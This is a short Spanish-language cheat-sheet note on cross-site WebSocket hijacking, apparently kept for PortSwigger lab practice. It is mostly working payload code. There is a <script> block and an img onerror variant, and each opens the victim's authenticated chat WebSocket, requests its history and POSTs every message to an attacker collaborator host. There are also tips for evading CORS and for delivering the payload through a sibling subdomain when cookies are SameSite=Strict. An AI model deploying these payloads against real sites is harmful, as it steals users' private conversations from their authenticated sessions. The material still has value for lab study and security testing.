# Exfiltrar el historial de un WebSocket

> Abrís el chat por WebSocket en la sesión de la víctima, mandás `READY` para que el server reenvíe el historial, y cada mensaje que llega lo exfiltrás a tu Collaborator. Cambiá `TARGET.net` por el host del chat y `OASTIFY.COM` por tu payload.

```html
<script>
    var ws = new WebSocket('wss://TARGET.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

- `wss://` para HTTPS (usá `ws://` solo si el sitio es HTTP).
- `READY` es el trigger típico de los labs de PortSwigger para que el chat devuelva el historial; cambialo si el server espera otro mensaje.
- `mode:'no-cors'` deja mandar el POST sin que CORS te frene (no necesitás leer la respuesta, solo causar el envío).

**Versión `img onerror` (inyección en HTML sin `<script>`):**
```html
<img src=x onerror="var ws=new WebSocket('wss://TARGET.net/chat');ws.onopen=()=>ws.send('READY');ws.onmessage=e=>fetch('https://OASTIFY.COM',{method:'POST',mode:'no-cors',body:e.data})">
```

> [!note] SameSite=Strict → subdominio hermano
> Si la cookie de sesión es `Strict`, este payload no lleva la cookie desde tu exploit server. Entregalo vía **XSS en un subdominio hermano** (mismo *site*) para que el WebSocket viaje autenticado → [[../../vulnerabilities/003-csrf/csrf#4) Subdominio hermano (SameSite=Strict) — ejemplo real con WebSocket|PoC subdominio hermano]].

## 🔗 [[exfil-oastify]] · [[fetch-then-exfil]] · [[../../vulnerabilities/012-websockets/websocket|WebSockets]]
